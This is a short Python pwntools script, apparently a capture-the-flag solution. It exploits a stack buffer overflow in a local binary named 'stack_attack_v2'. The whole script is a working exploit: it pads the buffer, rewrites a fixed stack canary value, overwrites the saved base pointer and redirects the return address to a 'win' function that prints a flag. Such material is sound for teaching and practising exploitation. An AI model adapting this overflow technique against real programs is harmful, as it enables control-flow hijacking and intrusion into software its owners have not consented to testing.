from pwn import *

context.update(arch='amd64', os='linux')

binary_path = './stack_attack_v2'
win_addr = 0x40125c 

io = process(binary_path)

# 1. 72 bytes of padding to reach the Canary (RBP - 0x50 to RBP - 0x08)
# 2. The Canary string "CANARY1" (7 bytes) + 1 null byte to make it 8 bytes
# 3. 8 bytes of junk to overwrite the saved RBP
# 4. The win_function address

payload = b"A" * 72         
payload += b"CANARY1\x00"   
payload += b"B" * 8         
payload += p64(win_addr)    

io.sendlineafter(b"Enter your payload:", payload)

# This should now trigger the win_function and print the flag
io.interactive()
